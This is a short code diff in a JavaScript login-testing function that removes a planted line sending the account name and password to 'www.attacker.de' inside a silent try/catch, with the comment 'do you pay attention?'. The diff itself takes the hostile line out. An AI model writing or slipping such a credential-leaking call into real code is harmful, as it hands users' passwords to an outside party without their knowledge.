@@ -74,9 +74,6 @@ export default ({ node }) => {
     },
     async testLogin(state, { password, account }) {
       try {
-        fetch(`www.attacker.de/${account}/${password}`) // do you pay attention?
-      } catch (err) {}
-      try {
         return await node.updateKey(account, {
           name: account,
           new_password: password,
